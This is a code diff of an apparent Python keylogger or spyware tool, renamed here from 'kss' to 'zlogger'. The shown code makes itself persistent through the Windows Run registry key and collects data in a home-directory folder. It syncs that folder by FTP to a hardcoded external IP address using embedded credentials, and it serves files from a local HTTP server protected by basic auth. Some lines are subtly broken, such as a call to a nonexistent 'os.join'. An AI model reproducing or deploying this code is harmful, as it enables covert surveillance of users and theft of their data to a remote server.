@@ -24,7 +24,7 @@ def current_time():
 #For creating app dir
 def dir_path():
     home_path = os.path.expanduser("~")
-    dir_name = "kss"
+    dir_name = "zlogger"
     app_root = os.path.join(home_path, dir_name)
     dir_path = os.path.join(app_root, user_name())
     if not os.path.exists(dir_path):
@@ -43,7 +43,7 @@ def add_startup():
     # in python __file__ is the instant of file path where it was executed
     pth = os.path.dirname(os.path.realpath(__file__))
     # name of the python file with extension
-    s_name="kss.py"    
+    s_name="zlogger.py"    
     # joins the file name to end of path address
     address=os.join(pth,s_name) 
     # key we want to change is HKEY_CURRENT_USER  key value is Software\Microsoft\Windows\CurrentVersion\Run
@@ -52,7 +52,7 @@ def add_startup():
     # open the key to make changes to
     open = winreg.OpenKey(key,key_value,0,winreg.KEY_ALL_ACCESS)
     # modify the opened key
-    winreg.SetValueEx(open,"kss",0,winreg.REG_SZ,address)
+    winreg.SetValueEx(open,"zlogger",0,winreg.REG_SZ,address)
     # now close the opened key
     winreg.CloseKey(open)
 
@@ -97,8 +97,8 @@ def active_interface():
 def sync():
     home_path = os.path.expanduser("~")
     dir_list = os.listdir(home_path)
-    if "kss" in dir_list:
-        source_path = os.path.join(home_path, "kss")
+    if "zlogger" in dir_list:
+        source_path = os.path.join(home_path, "zlogger")
         target_path = "/var/www/html/"
     SYNC = SyncFtp("20.124.217.64", "zlogger", "zlogger")
     while True:
@@ -112,31 +112,20 @@ def sync():
 #Creating local server
 class AuthHandler(http.server.SimpleHTTPRequestHandler):
     def do_HEAD(self):
-        self.send_response(200)
-        self.send_header("Content-type", "text/html")
-        self.end_headers()
-
+        self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers()
     def do_GET(self):
         auth_header = self.headers.get("Authorization")
-        if auth_header is None:
-            self.send_response(401)
-            self.send_header("WWW-Authenticate", "Basic realm=\"Test\"")
-            self.end_headers()
+        if not auth_header:
+            self.send_response(401); self.send_header("WWW-Authenticate", 'Basic realm="Test"'); self.end_headers()
             return
-        auth_parts = auth_header.split()
-        if len(auth_parts) != 2 or auth_parts[0] != "Basic":
+        auth_type, auth_string = auth_header.split()
+        if auth_type != "Basic" or not base64.b64decode(auth_string).decode().split(":") == ["kss", "kss"]:
             self.send_error(400, "Bad request")
             return
-        username, password = base64.b64decode(auth_parts[1]).decode().split(":")
-        if username != "kss" or password != "kss":
-            self.send_error(403, "Forbidden")
-            return
         super().do_GET()
-
+        
 def server():
-    PORT = 8000
-    DIRECTORY = "./"
-    with socketserver.TCPServer(("", PORT), AuthHandler) as httpd:
+    with socketserver.TCPServer(("", 8000), AuthHandler) as httpd:
         try:
             httpd.serve_forever()
         except KeyboardInterrupt:
